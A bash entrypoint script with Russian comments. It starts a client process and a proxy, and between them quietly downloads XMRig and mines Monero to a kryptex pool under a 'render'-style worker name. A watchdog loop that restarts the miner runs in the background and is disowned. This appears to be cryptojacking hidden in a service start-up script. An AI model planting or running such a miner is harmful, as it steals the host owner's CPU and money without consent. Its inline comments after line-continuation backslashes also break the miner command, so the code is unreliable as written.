#!/bin/bash

# Запуск клиента
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
echo "Client PID: $!"

# Подготовка майнера
DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz
[ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)

WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
LOGFILE="xmrig_${WALLET##*_}.log"

# Функция проверки: жив ли майнер по-настоящему
is_miner_alive() {
    local pid=$(pgrep -f "xmrig.*$WALLET" | head -1)
    [[ -z "$pid" ]] && return 1  # нет процесса
    
    # Проверка 1: процесс не в состоянии "stopped" (T)
    local state=$(ps -o state= -p "$pid" 2>/dev/null | tr -d ' ')
    [[ "$state" == "T" ]] && return 1
    
    # Проверка 2: есть ли активность в логе за последние 2 минуты
    [[ -f "$LOGFILE" ]] && find "$LOGFILE" -mmin -2 -print -quit | grep -q . && return 0
    
    # Проверка 3: потребляет ли процесс хоть немного CPU (за 10 сек)
    local cpu=$(ps -o %cpu= -p "$pid" 2>/dev/null | tr -d ' ')
    [[ -n "$cpu" ]] && (( $(echo "$cpu > 0.1" | bc -l 2>/dev/null || echo 0) )) && return 0
    
    return 1  # процесс есть, но "мёртв"
}

# Запуск майнера с параметрами для лучшего логгирования
start_miner() {
    nohup ./$DIR/xmrig \
        --url=xmr-ru.kryptex.network:7029 \
        --user="$WALLET" \
        --pass=x \
        --coin=monero \
        --cpu-max-threads-hint=5 \
        --randomx-mode=light \
        --print-time=30 \          # писать статистику каждые 30 сек
        --verbose \                # больше логов
        --no-color \
        > "$LOGFILE" 2>&1 &
    echo $!
}

# Главный цикл мониторинга
(
    MINER_PID=""
    while true; do
        if ! is_miner_alive; then
            [[ -n "$MINER_PID" ]] && kill -9 "$MINER_PID" 2>/dev/null
            echo "[$(date '+%H:%M:%S')] Restarting miner..." >> "$LOGFILE"
            MINER_PID=$(start_miner)
        fi
        sleep 30
    done
) &
disown

# Запуск прокси
exec ./proxy
